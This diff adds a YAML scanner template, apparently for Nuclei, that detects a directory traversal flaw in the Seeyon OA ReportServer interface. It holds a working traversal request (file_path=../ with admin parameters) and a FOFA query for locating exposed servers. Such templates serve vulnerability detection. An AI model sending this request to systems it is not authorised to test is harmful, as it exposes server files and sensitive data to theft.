@@ -1,0 +1,28 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - <?xml version="1.0" encoding="UTF-8"?>
+    - '<NODES '
+    - </NODES>
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true'
+id: seeyon-oa-reportserver-dir-traversal
+info:
+  author: Co5mos
+  description: "\u81F4\u8FDCOA \u5E06\u8F6F\u7EC4\u4EF6 ReportServer\u63A5\u53E3\u5B58\
+    \u5728\u76EE\u5F55\u904D\u5386\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\
+    \u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\u654F\u611F\u4FE1\u606F\
+    \u3002\n"
+  metadata:
+    fofa-query: "title=\"\u81F4\u8FDCA8-V5\u534F\u540C\u7BA1\u7406\u8F6F\u4EF6 V6.1sp1\""
+  name: Seeyon OA ReportServer Directory Traversal
+  severity: high
+  tags: directory-traversal, seeyon, oa,lfi
